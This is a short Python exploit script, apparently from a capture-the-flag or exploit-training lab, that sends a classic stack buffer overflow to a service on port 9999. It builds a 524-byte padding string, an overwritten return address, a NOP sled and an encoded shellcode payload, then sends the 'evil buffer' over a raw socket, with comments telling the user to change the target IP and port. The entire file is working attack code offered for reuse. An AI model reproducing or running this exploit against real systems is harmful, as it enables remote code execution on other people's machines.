#!/usr/share/python

import socket

ip = '10.10.161.220'		# Change to IP Host
port = 9999			# Change to Port Host

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = ("\xba\x44\xb8\x47\xa5\xda\xd1\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\x14\xb6\xa5\x50\xa5"
"\x1d\xde\x78\x96\xe2\x72\x15\x1a\x6c\x95\x59\x7c\xa3\xd6"
"\x09\xd9\x8b\xe8\xe0\x59\xa2\x6f\x02\x31\x3f\x81\x8b\x1e"
"\x57\xa3\x73\xb1\xf4\x2a\x92\x01\x62\x7d\x04\x32\xd8\x7e"
"\x2f\x55\xd3\x01\x7d\xfd\x82\x2e\xf1\x95\x32\x1e\xda\x07"
"\xaa\xe9\xc7\x95\x7f\x63\xe6\xa9\x8b\xbe\x69")

buffer = overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((ip, port))
	#s.recv(1024)
	print("Sending evil buffer...")
	s.send(bytes(buffer + "\r\n", "latin-1"))
	print("Done!")
except:
	print("Could not connect.")
